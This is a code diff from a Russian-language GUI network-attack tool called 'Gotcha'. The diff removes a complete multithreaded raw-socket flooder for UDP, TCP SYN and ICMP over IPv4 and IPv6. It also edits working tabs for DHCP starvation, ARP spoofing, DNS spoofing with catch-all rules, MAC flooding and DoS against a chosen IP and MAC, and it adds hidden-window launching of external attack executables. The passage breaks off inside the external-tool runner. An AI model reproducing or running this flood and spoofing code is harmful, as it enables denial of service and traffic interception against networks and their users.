@@ -29,372 +29,18 @@ def find_exe(exe_name):
     else:
         base_dir = os.path.dirname(os.path.abspath(__file__))
     search_paths = [
-        os.path.join(base_dir, "exe", exe_name),
+        os.path.join(base_dir, "bin", exe_name),
         os.path.join(base_dir, exe_name),
-        os.path.join(os.getcwd(), "exe", exe_name),
+        os.path.join(os.getcwd(), "bin", exe_name),
         os.path.join(os.getcwd(), exe_name),
+        
     ]
     for path in search_paths:
         if os.path.isfile(path):
             return path
     return None
 
-class RSattack:
-    def __init__(self):
-        self.running = False
-        self.threads = []
-        self.stats_lock = threading.Lock()
-        self.stats = {
-            'total_sent': 0,
-            'current_pps': 0,
-            'start_time': 0,
-            'total_bytes': 0,
-            'last_update': 0
-        }
-        self.udp_data_cache = {}
-        self._monitor_lock = threading.Lock()
-        self._completion_notified = False
-
-    def start_udp_attack(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
-        try:
-            socket.inet_pton(socket.AF_INET6, target_ip)
-            is_ipv6 = True
-        except socket.error:
-            is_ipv6 = False
-
-        if is_ipv6:
-            return self.start_udp_attack_ipv6(target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete)
-
-        self.running = True
-        self._completion_notified = False
-        self.stats = {
-            'total_sent': 0,
-            'current_pps': 0,
-            'start_time': time.time(),
-            'total_bytes': 0,
-            'last_update': time.time()
-        }
-        try:
-            source_ip = get_if_addr(interface)
-            if not source_ip or source_ip == '0.0.0.0':
-                source_ip = "192.168.1.1"
-        except:
-            source_ip = "192.168.1.1"
-        data_size = max(0, packet_size - 28)
-        cache_key = f"{packet_size}_{port}"
-        if cache_key not in self.udp_data_cache:
-            self.udp_data_cache[cache_key] = {
-                'data': os.urandom(data_size),
-                'pseudo_header': self._create_udp_pseudo_header(source_ip, target_ip, port, data_size)
-            }
-        cached = self.udp_data_cache[cache_key]
-        data = cached['data']
-        pseudo_header_template = cached['pseudo_header']
-        total_length = 28 + data_size
-        if platform.system() == "Windows":
-            num_threads = 8
-        else:
-            num_threads = 16
-        app_log(f"UDP flood: {num_threads} threads, packet size {packet_size} bytes")
-        app_log(f"Target: {target_ip}:{port}")
-        app_log(f"Interface: {interface} (src_ip: {source_ip})")
-        worker_threads = []
-        for i in range(num_threads):
-            thread = threading.Thread(
-                target=self._udp_raw_worker,
-                args=(i, target_ip, port, total_length, duration, continuous, 
-                      interface, source_ip, data, pseudo_header_template, app_log),
-                daemon=True
-            )
-            thread.start()
-            self.threads.append(thread)
-            worker_threads.append(thread)
-        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
-        stats_thread.start()
-        self.threads.append(stats_thread)
-        monitor_thread = threading.Thread(
-            target=self._monitor_udp_workers,
-            args=(worker_threads, on_complete),
-            daemon=True
-        )
-        monitor_thread.start()
-        self.threads.append(monitor_thread)
-        return True
-
-    def start_udp_attack_ipv6(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
-        self.running = True
-        self._completion_notified = False
-        self.stats = {
-            'total_sent': 0,
-            'current_pps': 0,
-            'start_time': time.time(),
-            'total_bytes': 0,
-            'last_update': time.time()
-        }
-        num_threads = min(8, os.cpu_count() or 2)
-        app_log(f"IPv6 UDP flood: {num_threads} threads, packet size {packet_size} bytes")
-        app_log(f"Target: [{target_ip}]:{port}")
-        app_log(f"Interface: {interface}")
-        worker_threads = []
-        for i in range(num_threads):
-            thread = threading.Thread(
-                target=self._udp_ipv6_worker,
-                args=(i, target_ip, port, packet_size, duration, continuous, interface, app_log),
-                daemon=True
-            )
-            thread.start()
-            self.threads.append(thread)
-            worker_threads.append(thread)
-        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
-        stats_thread.start()
-        self.threads.append(stats_thread)
-        monitor_thread = threading.Thread(
-            target=self._monitor_udp_workers,
-            args=(worker_threads, on_complete),
-            daemon=True
-        )
-        monitor_thread.start()
-        self.threads.append(monitor_thread)
-        return True
-
-    def _udp_ipv6_worker(self, thread_id, target_ip, port, packet_size, total_seconds, continuous, interface, app_log):
-        sent = 0
-        start_time = time.time()
-        payload = os.urandom(max(0, packet_size - 48))
-        while self.running and (continuous or (time.time() - start_time) < total_seconds):
-            try:
-                pkt = IPv6(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=port) / payload
-                send(pkt, iface=interface, verbose=0)
-                sent += 1
-                with self.stats_lock:
-                    self.stats['total_sent'] += 1
-                    self.stats['total_bytes'] += len(pkt)
-            except Exception as e:
-                app_log(f"[IPv6 UDP-{thread_id}] Error: {str(e)[:80]}")
-                time.sleep(0.1)
-            if sent % 100 == 0:
-                time.sleep(0.0005)
-
-    def start_tcp_attack_ipv6(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
-        self.running = True
-        self._completion_notified = False
-        self.stats = {
-            'total_sent': 0,
-            'current_pps': 0,
-            'start_time': time.time(),
-            'total_bytes': 0,
-            'last_update': time.time()
-        }
-        num_threads = min(8, os.cpu_count() or 2)
-        app_log(f"IPv6 TCP flood: {num_threads} threads, packet size {packet_size} bytes")
-        app_log(f"Target: [{target_ip}]:{port}")
-        app_log(f"Interface: {interface}")
-        worker_threads = []
-        for i in range(num_threads):
-            thread = threading.Thread(
-                target=self._tcp_ipv6_worker,
-                args=(i, target_ip, port, packet_size, duration, continuous, interface, app_log),
-                daemon=True
-            )
-            thread.start()
-            self.threads.append(thread)
-            worker_threads.append(thread)
-        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
-        stats_thread.start()
-        self.threads.append(stats_thread)
-        monitor_thread = threading.Thread(
-            target=self._monitor_udp_workers,
-            args=(worker_threads, on_complete),
-            daemon=True
-        )
-        monitor_thread.start()
-        self.threads.append(monitor_thread)
-        return True
-
-    def _tcp_ipv6_worker(self, thread_id, target_ip, port, packet_size, total_seconds, continuous, interface, app_log):
-        sent = 0
-        start_time = time.time()
-        payload = os.urandom(max(0, packet_size - 60))
-        while self.running and (continuous or (time.time() - start_time) < total_seconds):
-            try:
-                pkt = IPv6(dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S") / payload
-                send(pkt, iface=interface, verbose=0)
-                sent += 1
-                with self.stats_lock:
-                    self.stats['total_sent'] += 1
-                    self.stats['total_bytes'] += len(pkt)
-            except Exception as e:
-                app_log(f"[IPv6 TCP-{thread_id}] Error: {str(e)[:80]}")
-                time.sleep(0.1)
-            if sent % 100 == 0:
-                time.sleep(0.0005)
-
-    def start_icmp_attack_ipv6(self, target_ip, packet_size, duration, continuous, interface, app_log, on_complete=None):
-        self.running = True
-        self._completion_notified = False
-        self.stats = {
-            'total_sent': 0,
-            'current_pps': 0,
-            'start_time': time.time(),
-            'total_bytes': 0,
-            'last_update': time.time()
-        }
-        num_threads = min(8, os.cpu_count() or 2)
-        app_log(f"IPv6 ICMP flood: {num_threads} threads, packet size {packet_size} bytes")
-        app_log(f"Target: [{target_ip}]")
-        app_log(f"Interface: {interface}")
-        worker_threads = []
-        for i in range(num_threads):
-            thread = threading.Thread(
-                target=self._icmp_ipv6_worker,
-                args=(i, target_ip, packet_size, duration, continuous, interface, app_log),
-                daemon=True
-            )
-            thread.start()
-            self.threads.append(thread)
-            worker_threads.append(thread)
-        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
-        stats_thread.start()
-        self.threads.append(stats_thread)
-        monitor_thread = threading.Thread(
-            target=self._monitor_udp_workers,
-            args=(worker_threads, on_complete),
-            daemon=True
-        )
-        monitor_thread.start()
-        self.threads.append(monitor_thread)
-        return True
-
-    def _icmp_ipv6_worker(self, thread_id, target_ip, packet_size, total_seconds, continuous, interface, app_log):
-        sent = 0
-        start_time = time.time()
-        payload = os.urandom(max(0, packet_size - 48))
-        while self.running and (continuous or (time.time() - start_time) < total_seconds):
-            try:
-                pkt = IPv6(dst=target_ip) / ICMPv6EchoRequest() / payload
-                send(pkt, iface=interface, verbose=0)
-                sent += 1
-                with self.stats_lock:
-                    self.stats['total_sent'] += 1
-                    self.stats['total_bytes'] += len(pkt)
-            except Exception as e:
-                app_log(f"[IPv6 ICMP-{thread_id}] Error: {str(e)[:80]}")
-                time.sleep(0.1)
-            if sent % 100 == 0:
-                time.sleep(0.0005)
-
-    def _monitor_udp_workers(self, worker_threads, on_complete=None):
-        for thread in worker_threads:
-            thread.join()
-        with self._monitor_lock:
-            should_notify = self.running and not self._completion_notified
-            self.running = False
-            if should_notify:
-                self._completion_notified = True
-        if should_notify and on_complete:
-            on_complete()
-
-    def _udp_raw_worker(self, thread_id, target_ip, port, total_length, total_seconds, 
-                        continuous, interface, source_ip, data, pseudo_header_template, app_log):
-        packets_sent = 0
-        src_port_base = (thread_id * 1000) + 1024
-        start_time = time.time()
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
-            batch_size = 200
-            while self.running and (continuous or (time.time() - start_time) < total_seconds):
-                batch_packets = []
-                for i in range(batch_size):
-                    if not continuous and (time.time() - start_time) >= total_seconds:
-                        break
-                    packet = self._create_udp_packet(
-                        source_ip, target_ip, port,
-                        total_length,
-                        packets_sent,
-                        src_port_base + (packets_sent % 1000),
-                        data,
-                        pseudo_header_template
-                    )
-                    batch_packets.append(packet)
-                    packets_sent += 1
-                try:
-                    for packet in batch_packets:
-                        sock.sendto(packet, (target_ip, 0))
-                    with self.stats_lock:
-                        self.stats['total_sent'] += len(batch_packets)
-                        self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
-                except Exception as e:
-                    time.sleep(0.005)
-                if packets_sent % 10000 == 0:
-                    time.sleep(0.0005)
-            sock.close()
-        except Exception as e:
-            app_log(f"[UDP-{thread_id}] Error: {str(e)[:80]}")
-
-    def _create_udp_pseudo_header(self, src_ip, dst_ip, dst_port, data_size):
-        return struct.pack('!4s4sBBH',
-            socket.inet_aton(src_ip),
-            socket.inet_aton(dst_ip),
-            0, 17,
-            8 + data_size)
-
-    def _create_udp_packet(self, src_ip, dst_ip, dst_port, total_length, seq_num, src_port, data, pseudo_header_template):
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-            0x45, 0x00,
-            total_length,
-            (seq_num >> 16) & 0xFFFF,
-            0x4000,
-            64, 17, 0,
-            socket.inet_aton(src_ip),
-            socket.inet_aton(dst_ip)
-        )
-        udp_header = struct.pack('!HHHH',
-            src_port, dst_port,
-            8 + len(data), 0
-        )
-        udp_checksum = self._calculate_checksum_fast(pseudo_header_template + udp_header + data)
-        udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
-        ip_checksum = self._calculate_checksum_fast(ip_header)
-        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
-        return ip_header + udp_header + data
-
-    def _calculate_checksum_fast(self, data):
-        if len(data) % 2:
-            data += b'\x00'
-        s = 0
-        mv = memoryview(data)
-        for i in range(0, len(mv), 2):
-            w = (mv[i] << 8) + mv[i+1]
-            s += w
-        s = (s & 0xffff) + (s >> 16)
-        s = (s & 0xffff) + (s >> 16)
-        return ~s & 0xffff
-
-    def _stats_worker(self):
-        last_time = time.time()
-        last_count = 0
-        while self.running:
-            time.sleep(0.5)
-            current_time = time.time()
-            with self.stats_lock:
-                current_count = self.stats['total_sent']
-                time_diff = current_time - last_time
-                if time_diff > 0:
-                    pps = int((current_count - last_count) / time_diff)
-                    self.stats['current_pps'] = pps
-                last_time = current_time
-                last_count = current_count
-
-    def stop(self):
-        self.running = False
-        for thread in self.threads:
-            if thread.is_alive():
-                thread.join(timeout=0.5)
-        self.threads.clear()
-        return self.stats.copy()
-
+# Класс для DNS-флуда (остаётся через scapy)
 class Sattack:
     def __init__(self):
         self.running = False
@@ -965,7 +611,7 @@ class Gotcha:
         self.selected_packet = None
         self.intercept_packets = []
         self.edited_packet = None
-        self.raw_attack = RSattack()
+        # Удалён self.raw_attack (больше не нужен, используем только внешние exe)
         self.scapy_attack = Sattack()
         self.network_interfaces = self.get_interface_list()
         self.active_interface = self.get_active_interface()
@@ -1075,7 +721,7 @@ class Gotcha:
                                   font=('Arial', 8), width=12)
         self.ram_label.pack(side='right', padx=(2, 10))
 
-    # -------------------- Access tab (unchanged) --------------------
+    # -------------------- Access tab --------------------
     def setup_access_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1161,6 +807,7 @@ class Gotcha:
                     ['ping', '-n', '4', ip],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
                     text=True,
                     encoding='cp866',
                     errors='replace',
@@ -1210,6 +857,7 @@ class Gotcha:
                     cmd,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
                     text=True,
                     encoding=encoding,
                     errors='replace',
@@ -1236,7 +884,7 @@ class Gotcha:
 
     def get_ip_route_formatted(self):
         try:
-            result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866', errors='replace')
+            result = subprocess.run(['route', 'print'], capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW, text=True, encoding='cp866', errors='replace')
             lines = result.stdout.split('\n')
             ipv4_section = []
             in_ipv4 = False
@@ -1283,7 +931,7 @@ class Gotcha:
         except Exception as e:
             return f"Ошибка получения сетевых адаптеров: {str(e)}"
 
-    # -------------------- DHCP Starvation (unchanged) --------------------
+    # -------------------- DHCP Starvation --------------------
     def setup_dhcp_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1372,7 +1020,7 @@ class Gotcha:
             'last_sent': 0
         }
         self.dhcp_offered_ips = set()
-        self.dhcp_offers = {}                     
+        self.dhcp_offers = {}
         self.dhcp_lock = threading.Lock()
         self.dhcp_sniff_stop = None
         self.dhcp_sniff_thread = None
@@ -1428,7 +1076,7 @@ class Gotcha:
                     if opt[0] == 'message-type':
                         msg_type = opt[1]
                         break
-                if msg_type == 2:         
+                if msg_type == 2:
                     try:
                         xid = pkt[BOOTP].xid
                         offered_ip = pkt[BOOTP].yiaddr
@@ -1442,7 +1090,7 @@ class Gotcha:
                             self.dhcp_log.insert('end', f"[OFFER] IP {offered_ip} для xid {xid}\n")
                     except:
                         pass
-                elif msg_type == 5:       
+                elif msg_type == 5:
                     try:
                         xid = pkt[BOOTP].xid
                         ip = pkt[BOOTP].yiaddr
@@ -1471,7 +1119,7 @@ class Gotcha:
             self.dhcp_thread.join(timeout=1.0)
         total_time = time.time() - self.dhcp_stats['start_time']
         total_packets = self.dhcp_stats['sent_packets']
-        total_bytes = total_packets * 590                      
+        total_bytes = total_packets * 590
         self.dhcp_log.insert('end', "\n--- Results ---\n")
         self.dhcp_log.insert('end', f"Total packets sent: {total_packets}\n")
         self.dhcp_log.insert('end', f"Unique MACs: {len(self.dhcp_stats['unique_macs'])}\n")
@@ -1520,7 +1168,7 @@ class Gotcha:
                 if mac in used_macs:
                     continue
                 used_macs.add(mac)
-                self.dhcp_stats['unique_macs'].add(mac)                           
+                self.dhcp_stats['unique_macs'].add(mac)
                 used_macs.add(mac)
                 mac_bytes = bytes.fromhex(mac.replace(':', ''))
                 xid = random.randint(1, 0xFFFFFFFF)
@@ -1539,7 +1187,7 @@ class Gotcha:
                         if xid in self.dhcp_offers:
                             offered_ip = self.dhcp_offers.pop(xid)
                             break
-                    time.sleep(0.1)                            
+                    time.sleep(0.1)
                 if offered_ip:
                     dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                                 IP(src="0.0.0.0", dst="255.255.255.255") / \
@@ -1574,7 +1222,7 @@ class Gotcha:
             self.dhcp_log.insert('end', f"DHCP Starvation error: {str(e)}\n")
             self.stop_dhcp_attack()
 
-    # -------------------- ARP Spoofing (unchanged) --------------------
+    # -------------------- ARP Spoofing --------------------
     def setup_arp_spoof_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1685,7 +1333,7 @@ class Gotcha:
             self.restore_arp()
         total_time = time.time() - self.arp_spoof_stats['start_time']
         total_packets = self.arp_spoof_stats['sent_packets']
-        total_bytes = total_packets * 42                          
+        total_bytes = total_packets * 42
         self.arp_spoof_log.insert('end', "\n--- Results ---\n")
         self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
         self.arp_spoof_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
@@ -1706,7 +1354,7 @@ class Gotcha:
             winreg.CloseKey(key)
             subprocess.run(["netsh", "interface", "ipv4", "set", "interface",
                             self.arp_spoof_interface.get(), "forwarding=" + ("enabled" if enable else "disabled")],
-                           capture_output=True)
+                           capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             self.arp_spoof_log.insert('end', f"IP forwarding {'включён' if enable else 'отключён'}\n")
         except Exception as e:
             self.arp_spoof_log.insert('end', f"Не удалось изменить IP forwarding: {e}\n")
@@ -1790,7 +1438,7 @@ class Gotcha:
         except Exception as e:
             self.arp_spoof_log.insert('end', f"ARP Spoofing error: {str(e)}\n")
 
-    # -------------------- DNS Spoofing (new) --------------------
+    # -------------------- DNS Spoofing --------------------
     def setup_dns_spoof_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1799,7 +1447,6 @@ class Gotcha:
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
 
-        # Parameters frame
         params_frame = ttk.LabelFrame(left_frame, text="Параметры DNS Spoofing")
         params_frame.pack(fill='x', padx=5, pady=5)
         row1 = ttk.Frame(params_frame)
@@ -1819,7 +1466,6 @@ class Gotcha:
         self.dns_spoof_all_var = tk.BooleanVar(value=False)
         ttk.Checkbutton(row3, text="Подменять все запросы (catch-all)", variable=self.dns_spoof_all_var).pack(anchor='w', padx=5)
 
-        # Rules table
         rules_frame = ttk.LabelFrame(left_frame, text="Правила подмены (домен → IP)")
         rules_frame.pack(fill='both', expand=True, padx=5, pady=5)
         columns = ("Домен", "IP адрес")
@@ -1843,7 +1489,6 @@ class Gotcha:
         ttk.Button(add_frame, text="Добавить", command=self.add_dns_rule, width=10).pack(side='left', padx=2)
         ttk.Button(add_frame, text="Удалить", command=self.remove_dns_rule, width=10).pack(side='left', padx=2)
 
-        # Control buttons
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
         self.dns_spoof_start_btn = ttk.Button(button_frame, text="Начать DNS Spoofing",
@@ -1853,7 +1498,6 @@ class Gotcha:
                                             command=self.stop_dns_spoof, width=15, state='disabled')
         self.dns_spoof_stop_btn.pack(side='left', padx=5)
 
-        # Statistics frame
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
         stats_grid = ttk.Frame(stats_frame)
@@ -1871,7 +1515,6 @@ class Gotcha:
         self.dns_time_label = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.dns_time_label.grid(row=3, column=1, padx=5, pady=2, sticky='w')
 
-        # Log frame
         log_frame = ttk.LabelFrame(right_frame, text="Лог DNS Spoofing")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
         self.dns_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
@@ -2018,16 +1661,13 @@ class Gotcha:
 
                         with self.dns_spoof_lock:
                             self.dns_spoof_stats['spoofed'] += 1
-
                         self.dns_spoof_log.insert('end', f"[SPOOF] {qname} -> {spoof_ip} (3 копии, TTL=1)\n")
                         self.dns_spoof_log.see('end')
-
                     except Exception as e:
                         self.dns_spoof_log.insert('end', f"[ERROR] {qname}: {str(e)}\n")
                 else:
                     self.dns_spoof_log.insert('end', f"[PASS] {qname}\n")
                     self.dns_spoof_log.see('end')
-
                 with self.dns_spoof_lock:
                     self.dns_spoof_stats['intercepted'] += 1
 
@@ -2066,7 +1706,7 @@ class Gotcha:
         if self.dns_spoof_running:
             self.root.after(1000, self.update_dns_spoof_stats)
 
-    # -------------------- MAC flood (unchanged) --------------------
+    # -------------------- MAC flood --------------------
     def setup_mac_flood_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2147,9 +1787,9 @@ class Gotcha:
             self.mac_attack_running = False
             self.mac_start_btn.config(state='normal')
             return
-        exe_path = find_exe("mac.exe")
+        exe_path = find_exe("NPmac-aT.exe")
         if not exe_path:
-            self.mac_log.insert('end', "Error: mac.exe not found!\n")
+            self.mac_log.insert('end', "Error: NPmac-aT.exe not found!\n")
             self.mac_attack_running = False
             self.mac_start_btn.config(state='normal')
             return
@@ -2215,7 +1855,7 @@ class Gotcha:
         self.mac_start_btn.config(state='normal')
         self.mac_stop_btn.config(state='disabled')
 
-    # -------------------- DoS attack tab (unchanged) --------------------
+    # -------------------- DoS attack tab (переработано полностью) --------------------
     def setup_custom_attack_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2223,29 +1863,45 @@ class Gotcha:
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
+
         params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
         params_frame.pack(fill='x', padx=5, pady=5)
+
+        # IP адрес
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
         self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
         self.custom_ip.pack(side='left', padx=2)
         self.custom_ip.insert(0, "192.168.1.1")
+
+        # Протокол
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
-        self.custom_protocol = ttk.Combobox(row2, values=[
-            "ICMP", "TCP", "UDP", "ARP", "DNS"
-        ], width=15, font=('Arial', 9))
+        self.custom_protocol = ttk.Combobox(row2, values=["TCP", "UDP", "ICMP", "ARP", "DNS"], width=15, font=('Arial', 9))
         self.custom_protocol.pack(side='left', padx=2)
         self.custom_protocol.set("TCP")
         self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)
+
+        # Порт (показывается только для TCP/UDP)
         self.custom_port_frame = ttk.Frame(params_frame)
         self.custom_port_frame.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
         self.custom_port = ttk.Entry(self.custom_port_frame, width=10, font=('Arial', 9))
         self.custom_port.pack(side='left', padx=2)
         self.custom_port.insert(0, "80")
+
+        # MAC назначения (жертвы) – показывается для всех, кроме DNS
+        row_mac = ttk.Frame(params_frame)
+        row_mac.pack(fill='x', padx=5, pady=5)
+        ttk.Label(row_mac, text="MAC назначения:", width=12).pack(side='left', padx=2)
+        self.custom_dst_mac = ttk.Entry(row_mac, width=25, font=('Arial', 9))
+        self.custom_dst_mac.pack(side='left', padx=2)
+        self.custom_dst_mac.insert(0, "ff:ff:ff:ff:ff:ff")
+        self.custom_dst_mac.master = row_mac
+
+        # Размер пакета (показывается для TCP/UDP/ICMP)
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
@@ -2253,6 +1909,9 @@ class Gotcha:
         self.custom_packet_size.pack(side='left', padx=2)
         self.custom_packet_size.insert(0, "1024")
         ttk.Label(row4, text="байт").pack(side='left', padx=2)
+        self.custom_packet_size.master = row4
+
+        # Время атаки
         row5 = ttk.Frame(params_frame)
         row5.pack(fill='x', padx=5, pady=5)
         ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
@@ -2260,27 +1919,33 @@ class Gotcha:
         self.custom_packet_count.pack(side='left', padx=2)
         self.custom_packet_count.insert(0, "60")
         ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)
+
+        # Опции случайный IP / MAC
         self.custom_options_frame = ttk.Frame(params_frame)
         self.custom_random_ip = tk.BooleanVar(value=False)
         self.custom_random_mac = tk.BooleanVar(value=False)
         ttk.Checkbutton(self.custom_options_frame, text="Случайный IP", variable=self.custom_random_ip).pack(side='left', padx=5)
         ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac).pack(side='left', padx=5)
         self.custom_options_frame.pack(fill='x', padx=5, pady=5)
-        self.custom_options_frame.pack_forget()                    
+        self.custom_options_frame.pack_forget()  # изначально скрыто
+
+        # Интерфейс
         self.custom_row7 = ttk.Frame(params_frame)
         self.custom_row7.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
         self.custom_interface = ttk.Combobox(self.custom_row7, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.custom_interface.pack(side='left', padx=2)
         self.custom_interface.set(self.active_interface)
+
+        # Кнопки
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", 
-                                         command=self.start_custom_attack, width=15)
+        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", command=self.start_custom_attack, width=15)
         self.custom_start_btn.pack(side='left', padx=5)
-        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", 
-                                        command=self.stop_custom_attack, width=15, state='disabled')
+        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", command=self.stop_custom_attack, width=15, state='disabled')
         self.custom_stop_btn.pack(side='left', padx=5)
+
+        # Статистика
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
         stats_grid = ttk.Frame(stats_frame)
@@ -2294,14 +1959,16 @@ class Gotcha:
         ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
         self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
+
+        # Лог
         log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
         self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
         self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
         btn_frame = ttk.Frame(log_frame)
         btn_frame.pack(fill='x', padx=5, pady=5)
-        ttk.Button(btn_frame, text="Сохранить лог", 
-                  command=lambda: self.save_log(self.custom_log), width=14).pack()
+        ttk.Button(btn_frame, text="Сохранить лог", command=lambda: self.save_log(self.custom_log), width=14).pack()
+
         self.custom_attack_stats = {
             'start_time': 0,
             'sent_packets': 0,
@@ -2315,33 +1982,101 @@ class Gotcha:
     def on_protocol_change(self, event=None):
         proto = self.custom_protocol.get()
 
-        # 1. Управление полем порта
+        # Порт
         if proto in ["TCP", "UDP"]:
             self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                         if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
         else:
             self.custom_port_frame.pack_forget()
 
-        # 2. Управление полем размера пакета
+        # Размер пакета
         if proto in ["ARP", "DNS"]:
-            # Скрываем
             self.custom_packet_size.master.pack_forget()
         else:
-            # Показываем, но на правильном месте: перед custom_options_frame (если он виден) или перед custom_row7
             if not self.custom_packet_size.master.winfo_ismapped():
                 target = self.custom_options_frame if self.custom_options_frame.winfo_ismapped() else self.custom_row7
                 self.custom_packet_size.master.pack(fill='x', padx=5, pady=5, before=target)
-            # Восстанавливаем значение, если было обнулено
             if self.custom_packet_size.get() == "0":
                 self.custom_packet_size.delete(0, tk.END)
                 self.custom_packet_size.insert(0, "1024")
 
-        # 3. Управление опциями случайного IP/MAC
-        if proto in ["TCP", "ARP", "ICMP", "UDP"]:
+        # MAC назначения – скрываем для DNS
+        if proto == "DNS":
+            self.custom_dst_mac.master.pack_forget()
+        else:
+            if not self.custom_dst_mac.master.winfo_ismapped():
+                target = self.custom_port_frame if self.custom_port_frame.winfo_ismapped() else self.custom_options_frame
+                if not target.winfo_ismapped():
+                    target = self.custom_row7
+                self.custom_dst_mac.master.pack(fill='x', padx=5, pady=5, before=target)
+
+        # Опции случайный IP/MAC – только для TCP/UDP/ARP/ICMP
+        if proto in ["TCP", "UDP", "ARP", "ICMP"]:
             self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
         else:
             self.custom_options_frame.pack_forget()
             
+    def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
+        try:
+            if platform.system() == "Windows":
+                proc = subprocess.Popen(
+                    args,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    stdin=subprocess.PIPE if infinite else None,
+                    text=True,
+                    bufsize=1,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            else:
+                proc = subprocess.Popen(
+                    args,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    stdin=subprocess.PIPE if infinite else None,
+                    text=True,
+                    bufsize=1
+                )
+            self.external_processes[process_key] = (proc, stop_event)
+            for line in iter(proc.stdout.readline, ''):
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    data = json.loads(line)
+                    if data.get('type') == 'stats':
+                        if stats_callback:
+                            self.root.after(0, stats_callback, data)
